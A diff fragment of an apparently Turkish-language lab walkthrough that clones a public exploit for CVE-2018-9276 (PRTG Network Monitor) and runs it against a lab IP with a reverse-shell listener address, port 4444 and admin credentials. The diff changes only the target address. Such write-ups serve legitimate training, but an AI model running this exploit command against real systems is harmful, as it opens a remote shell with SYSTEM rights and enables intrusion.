@@ -130,7 +130,7 @@ Bu zincirin en kritik noktası: **komutu tetikleyen servis SYSTEM olarak çalı�
 git clone https://github.com/A1vinSmith/CVE-2018-9276
 cd CVE-2018-9276
 
-./exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.187 --lport 4444 \
+./exploit.py -i 10.129.50.29 -p 80 --lhost 10.10.14.187 --lport 4444 \
   --user prtgadmin --password PrTg@dmin2019
 ```
 
